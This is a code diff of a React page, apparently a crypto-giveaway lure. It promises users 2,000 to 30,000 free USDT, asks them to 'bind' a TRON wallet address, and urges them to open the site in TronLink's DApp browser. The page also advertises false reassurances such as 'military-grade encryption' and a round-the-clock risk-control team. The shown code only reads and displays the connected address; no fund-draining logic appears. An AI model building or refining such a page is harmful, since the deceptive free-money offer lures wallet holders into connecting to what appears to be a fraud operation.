@@ -2,786 +2,651 @@
 
 import { useState } from "react";
 
-import {
-  useWallet,
-} from "@tronweb3/tronwallet-adapter-react-hooks";
 
+export default function Home(){
 
-export default function Home() {
 
+const [amount,setAmount]=useState("2000");
 
-  const {
-    connect,
-    connected,
-    address,
-  } = useWallet();
+const [inputAddress,setInputAddress]=useState("");
 
+const [msg,setMsg]=useState("");
 
+const [showWalletModal,setShowWalletModal]=useState(false);
 
-  const [amount,setAmount] = useState("2000");
 
-  const [inputAddress,setInputAddress] = useState("");
 
-  const [msg,setMsg] = useState("");
 
-  const [showWalletModal,setShowWalletModal] = useState(false);
 
+async function bindWallet(){
 
 
+try{
 
 
-  async function bindWallet(){
+if(!inputAddress.trim()){
 
+setMsg("请输入您的TRON钱包地址");
 
-    try{
+return;
 
+}
 
-      // 检查输入地址
 
-      if(!inputAddress.trim()){
 
 
-        setMsg(
-          "请输入您的TRON钱包地址"
-        );
+const tronReg=/^T[1-9A-HJ-NP-Za-km-z]{33}$/;
 
 
-        return;
+if(!tronReg.test(inputAddress)){
 
-      }
 
+setMsg("请输入正确的TRON钱包地址");
 
+return;
 
 
-      // TRON地址格式检查
+}
 
-      const tronReg =
-      /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
 
 
 
-      if(!tronReg.test(inputAddress)){
 
+// 检测 TronLink
 
-        setMsg(
-          "请输入正确的TRON钱包地址"
-        );
+if(
+typeof window==="undefined" ||
+!(window as any).tronWeb
+){
 
 
-        return;
+setShowWalletModal(true);
 
-      }
+return;
 
 
+}
 
 
 
-      // 检查钱包是否连接
 
-      if(!connected){
 
+const tronWeb=(window as any).tronWeb;
 
-        setShowWalletModal(true);
 
+const address =
+tronWeb.defaultAddress.base58;
 
-        return;
 
 
-      }
+if(!address){
 
 
+setMsg(
+"请先连接TronLink钱包"
+);
 
 
+return;
 
-      // 已连接获取地址
 
+}
 
-      setMsg(
-        "钱包地址：" + address
-      );
 
 
+setMsg(
+"钱包连接成功："+address
+);
 
-    }
-    catch(error){
 
 
-      console.log(error);
+}catch(e){
 
 
-      setMsg(
-        "钱包检测失败"
-      );
+console.log(e);
 
 
-    }
+setMsg(
+"钱包连接失败"
+);
 
 
-  }
+}
 
 
 
+}
 
 
 
 
-  async function connectWallet(){
 
 
-    try{
+function checkWallet(){
 
 
-      await connect();
+if(
+typeof window!=="undefined" &&
+(window as any).tronWeb
+){
 
 
+const address =
+(window as any)
+.tronWeb
+.defaultAddress
+.base58;
 
-      setShowWalletModal(false);
 
 
+setMsg(
+"当前钱包："+address
+);
 
-      setMsg(
-        "TronLink 钱包连接成功"
-      );
 
 
+}else{
 
-    }
-    catch(error){
 
+setMsg(
+"请在TronLink钱包DApp浏览器打开"
+);
 
-      console.log(error);
 
+}
 
 
-      setMsg(
-        "钱包连接失败"
-      );
 
+}
+return (
 
-    }
+<main className="min-h-screen bg-[#030817] text-white px-5 py-6">
 
 
-  }
-  return (
+{/* Header */}
 
+<div className="flex justify-between items-center">
 
-    <main className="min-h-screen bg-[#030817] text-white px-5 py-6">
 
+<div className="flex items-center gap-3">
 
 
-      {/* Header */}
+<div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">
 
+KK
 
-      <div className="flex justify-between items-center">
+</div>
 
 
-        <div className="flex items-center gap-3">
+<div>
 
+<div className="font-bold text-lg">
 
-          <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">
+自助领取USDT
 
-            KK
+</div>
 
-          </div>
 
+<div className="text-xs text-gray-400">
 
+Secure Web3 Service
 
-          <div>
+</div>
 
 
-            <div className="font-bold text-lg">
+</div>
 
-              自助领取USDT
 
-            </div>
+</div>
 
 
-            <div className="text-xs text-gray-400">
 
-              Secure Web3 Service
+<div className="rounded-full border border-white/10 px-4 py-2 text-sm">
 
-            </div>
+🟢 TRON Network
 
+</div>
 
-          </div>
 
+</div>
 
-        </div>
 
 
 
 
+{/* 标题 */}
 
-        <div className="rounded-full border border-white/10 px-4 py-2 text-sm">
+<div className="text-center mt-20">
 
-          🟢 TRON Network
 
-        </div>
+<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">
 
+⚡ 快速 · 安全 · 专业
 
+</div>
 
-      </div>
 
 
+<h1 className="text-4xl font-bold mt-8">
 
+提取地址绑定
 
+</h1>
 
 
 
-      {/* 标题 */}
+<p className="text-gray-400 mt-5 leading-8">
 
+绑定您的TRON钱包地址
 
-      <div className="text-center mt-20">
+<br/>
 
+用于USDT提取
 
-        <div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">
+</p>
 
-          ⚡ 快速 · 安全 · 专业
 
-        </div>
+</div>
 
 
 
-        <h1 className="text-4xl font-bold mt-8">
 
-          提取地址绑定
 
-        </h1>
 
+{/* 金额 */}
 
+<div className="mt-12">
 
-        <p className="text-gray-400 mt-5 leading-8">
 
-          绑定您的TRON钱包地址
+<h2 className="font-bold text-lg mb-5">
 
-          <br/>
+选择提取金额
 
-          用于USDT提取
+</h2>
 
-        </p>
 
 
+<label
 
-      </div>
+className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
+amount==="2000"
+?
+"border-cyan-400 bg-cyan-400/10"
+:
+"border-white/10 bg-white/5"
+}`}
 
+>
 
 
+<input
 
+type="radio"
 
+checked={amount==="2000"}
 
+onChange={()=>setAmount("2000")}
 
+className="hidden"
 
+/>
 
 
-      {/* 金额选择 */}
 
+<div className="text-cyan-300 text-sm">
 
+⭐ 新用户测试专用
 
-      <div className="mt-12">
+</div>
 
 
-        <h2 className="font-bold text-lg mb-5">
 
-          选择提取金额
+<div className="text-4xl font-bold mt-3">
 
-        </h2>
+2000
 
+<span className="text-xl text-cyan-300 ml-2">
 
+USDT
 
+</span>
 
 
-        <label
+</div>
 
-        className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
-        
-        amount==="2000"
-        
-        ?
-        
-        "border-cyan-400 bg-cyan-400/10"
-        
-        :
-        
-        "border-white/10 bg-white/5"
-        
-        }`}
 
+</label>
 
-        >
 
 
 
-          <input
 
-          type="radio"
+<div className="grid grid-cols-2 gap-4">
 
-          checked={amount==="2000"}
 
-          onChange={()=>setAmount("2000")}
+{
+["10000","20000","30000"].map(item=>(
 
-          className="hidden"
 
-          />
+<label
 
+key={item}
 
+className={`rounded-2xl border py-5 text-center cursor-pointer ${
+amount===item
+?
+"border-cyan-400 bg-cyan-400/20 text-cyan-300"
+:
+"border-white/10 bg-white/5"
+}
+${item==="30000"?"col-span-2":""}
+`}
 
-          <div className="text-cyan-300 text-sm">
 
-            ⭐ 新用户测试专用
+>
 
-          </div>
 
+<input
 
+type="radio"
 
-          <div className="text-4xl font-bold mt-3">
+checked={amount===item}
 
-            2000
+onChange={()=>setAmount(item)}
 
-            <span className="text-xl text-cyan-300 ml-2">
+className="hidden"
 
-              USDT
+/>
 
-            </span>
 
-          </div>
 
+{item} USDT
 
 
-          <div className="text-gray-400 mt-3 text-sm">
 
-            新用户体验额度
+</label>
 
-          </div>
 
+))
 
-        </label>
+}
 
 
 
+</div>
 
 
 
+<div className="text-center mt-5 text-sm text-gray-400">
 
 
-        <div className="grid grid-cols-2 gap-4">
+当前选择：
 
+<span className="text-cyan-300 ml-2">
 
+{amount} USDT
 
-          {
-          ["10000","20000","30000"].map(item=>(
+</span>
 
 
-          <label
+</div>
 
-          key={item}
 
-          className={`rounded-2xl border py-5 text-center cursor-pointer ${
-          
-          amount===item
-          
-          ?
-          
-          "border-cyan-400 bg-cyan-400/20 text-cyan-300"
-          
-          :
-          
-          "border-white/10 bg-white/5"
-          
-          }
-          
-          ${item==="30000"?"col-span-2":""}
-          
-          `}
 
+</div>
 
-          >
+{/* 地址 */}
 
+<div className="mt-12">
 
 
-          <input
+<h2 className="font-bold text-lg mb-5">
 
-          type="radio"
+输入接收地址
 
-          checked={amount===item}
+</h2>
 
-          onChange={()=>setAmount(item)}
 
-          className="hidden"
 
-          />
 
 
+<div className="flex items-center gap-4 bg-white/5 border border-white/10 rounded-3xl p-5">
 
-          {item} USDT
 
+<div className="w-12 h-12 rounded-xl bg-cyan-400/20 flex items-center justify-center text-cyan-300 font-bold">
 
+T
 
-          </label>
+</div>
 
 
 
-          ))
-          }
 
+<input
 
 
-        </div>
+value={inputAddress}
 
 
+onChange={(e)=>setInputAddress(e.target.value)}
 
 
+placeholder="请输入您的TRON钱包地址"
 
 
-        <div className="text-center mt-5 text-sm text-gray-400">
+className="flex-1 bg-transparent outline-none placeholder:text-gray-600"
 
 
-          当前选择：
+/>
 
-          <span className="text-cyan-300 ml-2">
 
-            {amount} USDT
 
-          </span>
+</div>
 
 
-        </div>
 
 
-      </div>
 
 
 
+<button
 
 
+onClick={bindWallet}
 
 
+className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400"
 
 
-      {/* 地址 */}
+>
 
 
-      <div className="mt-12">
+立即绑定
 
 
+</button>
 
-        <h2 className="font-bold text-lg mb-5">
 
-          输入接收地址
 
-        </h2>
 
 
 
+{
+msg &&
 
 
-        <div className="flex items-center gap-4 bg-white/5 border border-white/10 rounded-3xl p-5">
+<div className="text-center text-cyan-300 mt-4 text-sm">
 
 
-          <div className="w-12 h-12 rounded-xl bg-cyan-400/20 flex items-center justify-center text-cyan-300 font-bold">
+{msg}
 
-            T
 
-          </div>
+</div>
 
 
+}
 
 
 
-          <input
+</div>
 
 
-          value={inputAddress}
 
 
-          onChange={(e)=>setInputAddress(e.target.value)}
 
 
-          placeholder="请输入您的TRON钱包地址"
 
 
-          className="flex-1 bg-transparent outline-none placeholder:text-gray-600"
 
+{/* 安全区域 */}
 
-          />
 
+<div className="mt-12 space-y-4">
 
 
-        </div>
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
+🛡️ 军级加密技术，确保地址绑定安全
 
+</div>
 
 
 
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
-        <button
+⚡ 毫秒级处理速度，及时完成绑定
 
+</div>
 
-        onClick={bindWallet}
 
 
-        className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400"
+<div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
+🔰 专业风控团队，24小时安全保障
 
-        >
+</div>
 
 
-          立即绑定
+</div>
 
 
-        </button>
 
 
 
 
 
+<footer className="text-center mt-16 pb-10 text-gray-500">
 
 
-        {
-        msg &&
+<div className="text-2xl text-cyan-300 font-bold">
 
-        <div className="text-center text-cyan-300 mt-4 text-sm">
+KK
 
-          {msg}
+</div>
 
-        </div>
 
-        }
+Secure Web3 Infrastructure
 
 
+</footer>
 
 
 
 
 
-        {
-        connected && address && (
 
 
-        <div className="mt-5 rounded-2xl bg-white/5 border border-white/10 p-4">
 
 
-          <div className="text-green-400">
+{/* TronLink提示弹窗 */}
 
-            🟢 TronLink 已连接
 
-          </div>
 
+{
 
-          <div className="text-gray-400 mt-2 break-all">
+showWalletModal &&
 
-            {address}
 
-          </div>
+<div className="fixed inset-0 bg-black/70 flex items-center justify-center px-6 z-50">
 
 
-        </div>
+<div className="bg-[#101936] rounded-3xl p-8 text-center w-full max-w-sm border border-white/10">
 
 
-        )
-        }
 
+<img
 
+src="/tronlink-global.png"
 
-      </div>
-            {/* 安全区域 */}
+className="w-24 h-24 mx-auto rounded-2xl"
 
+/>
 
-      <div className="mt-12 space-y-4">
 
 
-        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
-          🛡️ 军级加密技术，确保地址绑定安全
 
-        </div>
+<h2 className="text-2xl font-bold mt-6">
 
+请在TronLink钱包中打开
 
+</h2>
 
-        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
 
-          ⚡ 毫秒级处理速度，及时完成绑定
 
-        </div>
 
+<p className="text-gray-400 mt-4 leading-7">
 
 
-        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">
+当前浏览器未检测到TronLink
 
-          🔰 专业风控团队，24小时安全保障
 
-        </div>
+<br/>
 
 
-      </div>
+请复制网址到TronLink DApp浏览器打开
 
 
+</p>
 
 
 
 
 
 
+<button
 
-      {/* Footer */}
 
+onClick={()=>setShowWalletModal(false)}
 
 
-      <footer className="text-center mt-16 pb-10 text-gray-500">
+className="mt-8 w-full rounded-2xl py-5 bg-gradient-to-r from-cyan-300 to-blue-400 text-black font-bold"
 
 
-        <div className="text-2xl text-cyan-300 font-bold">
+>
 
-          KK
 
-        </div>
+知道了
 
 
-        Secure Web3 Infrastructure
+</button>
 
 
-      </footer>
 
+</div>
 
 
+</div>
 
 
+}
 
 
 
+</main>
 
 
-
-
-      {/* TronLink连接弹窗 */}
-
-
-
-      {
-      showWalletModal &&
-
-
-
-      <div className="fixed inset-0 bg-black/70 flex items-center justify-center px-6 z-50">
-
-
-
-        <div className="bg-[#101936] rounded-3xl p-8 text-center w-full max-w-sm border border-white/10">
-
-
-
-
-
-          <img
-
-          src="/tronlink-global.png"
-
-          className="w-24 h-24 mx-auto rounded-2xl"
-
-          />
-
-
-
-
-
-
-
-          <h2 className="text-2xl font-bold mt-6">
-
-
-            连接TRON钱包
-
-
-          </h2>
-
-
-
-
-
-
-
-          <p className="text-gray-400 mt-4 leading-7">
-
-
-            请连接您的TronLink钱包
-
-            <br/>
-
-            安全访问DApp
-
-
-          </p>
-
-
-
-
-
-
-
-          <button
-
-
-          onClick={connectWallet}
-
-
-          className="mt-8 w-full rounded-2xl py-5 bg-gradient-to-r from-cyan-300 to-blue-400 text-black font-bold"
-
-
-          >
-
-
-            连接 TronLink 钱包
-
-
-          </button>
-
-
-
-
-
-
-
-
-          <button
-
-
-          onClick={()=>setShowWalletModal(false)}
-
-
-          className="mt-5 text-gray-400"
-
-
-          >
-
-
-            取消
-
-
-          </button>
-
-
-
-
-
-
-
-        </div>
-
-
-
-      </div>
-
-
-
-      }
-
-
-
-
-
-    </main>
-
-
-  );
+);
 
 
 }
